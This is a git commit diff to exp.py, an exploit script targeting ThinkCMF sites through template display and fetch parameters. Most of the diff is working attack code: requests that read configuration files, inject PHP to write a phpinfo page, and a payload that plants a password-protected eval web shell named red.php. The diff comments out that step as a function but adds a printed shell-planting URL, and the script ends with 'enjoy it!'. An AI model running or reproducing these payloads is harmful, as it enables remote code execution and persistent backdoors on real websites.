1dc08c9fc6061a368bac675863605c186538a422
BestReder <997594560@qq.com>
2020-02-18 14:41:43 +0800

    updata

--- exp.py
+++ exp.py
@@ -6,20 +6,14 @@ import requests
 import argparse
 from requests.exceptions import RequestException
 
-headers = {
-    'User-Agent':
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'
-}
+headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'}
 
 
 def payload_01(url):
     try:
-        response = requests.get((url + '?a=display&templateFile=README.md'),
-                                headers=headers,
-                                timeout=5)
+        response = requests.get((url + '?a=display&templateFile=README.md'),headers=headers,timeout=5)
         if '## README' in response.text:
-            print('[+]readme.md: {}?a=display&templateFile=README.md'.format(
-                url))
+            print('[+]readme.md: {}?a=display&templateFile=README.md'.format(url))
             return 0
         return 1
     except RequestException:
@@ -28,13 +22,10 @@ def payload_01(url):
 
 def payload_02(url):
     try:
-        response = requests.get((url + '?a=display&templateFile=config.yaml'),
-                                headers=headers,
-                                timeout=5)
+        response = requests.get((url + '?a=display&templateFile=config.yaml'),headers=headers,timeout=5)
         if 'name: thinkcmf' in response.text:
             print(
-                '[+]config.yaml: {}?a=display&templateFile=config.yaml'.format(
-                    url))
+                '[+]config.yaml: {}?a=display&templateFile=config.yaml'.format(url))
             return 0
         return 1
     except RequestException:
@@ -43,19 +34,13 @@ def payload_02(url):
 
 def payload_03(url):
     try:
-        response = requests.get((
-            url +
-            "?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo();?>')</php>"
-        ),
-                                headers=headers,
-                                timeout=5)
+        response = requests.get((url +"?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo();?>')</php>"),headers=headers,timeout=5)
         if response.status_code == 200:
-            response = requests.get((url + '/test.php'),
-                                    headers=headers,
-                                    timeout=5)
+            response = requests.get((url + '/test.php'),headers=headers,timeout=5)
             if response.status_code == 200:
                 if 'http://www.php.net' in response.text:
                     print('[+]phpinfo: {}/test.php'.format(url))
+                    print('''[+]can getshell:{}?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('red.php','by:zjun<?php eval($_POST["red"]);?>')</php>'''.format(url))
                     return 0
                 return 1
             return 1
@@ -64,29 +49,18 @@ def payload_03(url):
         return 2
 
 
-def payload_04(url):
-    try:
-        response = requests.get((
-            url +
-            '''?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('red.php','by:zjun <?php eval($_POST["red"]);?>')</php>'''
-        ),
-                                headers=headers,
-                                allow_redirects=False,
-                                timeout=5)
-        if response.status_code == 200:
-            response = requests.get((url + '/red.php'),
-                                    headers=headers,
-                                    allow_redirects=False,
-                                    timeout=5)
-            if 'by:zjun' in response.text:
-                print(
-                    '[+]Please connect to the shell. The password is red: {}/red.php'
-                    .format(url))
-                return 0
-            return 1
-        return 1
-    except RequestException:
-        return 2
+# def payload_04(url):
+#     try:
+#         response = requests.get((url +'''?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('red.php','by:zjun<?php eval($_POST["red"]);?>')</php>'''),headers=headers,allow_redirects=False,timeout=5)
+#         if response.status_code == 200:
+#             response = requests.get((url + '/red.php'),headers=headers,timeout=5)
+#             if 'zjun' in response.text:
+#                 print('[+]shell.password is red: {}/red.php'.format(url))
+#                 return 0
+#             return 1
+#         return 1
+#     except RequestException:
+#         return 2
 
 
 if __name__ == '__main__':
@@ -108,12 +82,10 @@ The script has some errors, please use it carefully, for reference only!
     payload_01 = payload_01(url)
     payload_02 = payload_02(url)
     payload_03 = payload_03(url)
-    payload_04 = payload_04(url)
-    if payload_01 and payload_02 and payload_03 and payload_04 == 2:
+    # payload_04 = payload_04(url)
+    if payload_01 and payload_02 and payload_03 == 2:
         print('[-]connection timed out:{}'.format(url))
-    elif payload_01 and payload_02 and payload_03 and payload_04 == 1:
-        print(
-            '[-]There is no thinkcmf vulnerability in the preliminary test: {}'
-            .format(url))
+    elif payload_01 and payload_02 and payload_03 == 1:
+        print('[-]There is no thinkcmf vulnerability in the preliminary test: {}'.format(url))
     else:
         print('^ _ ^ enjoy it!')
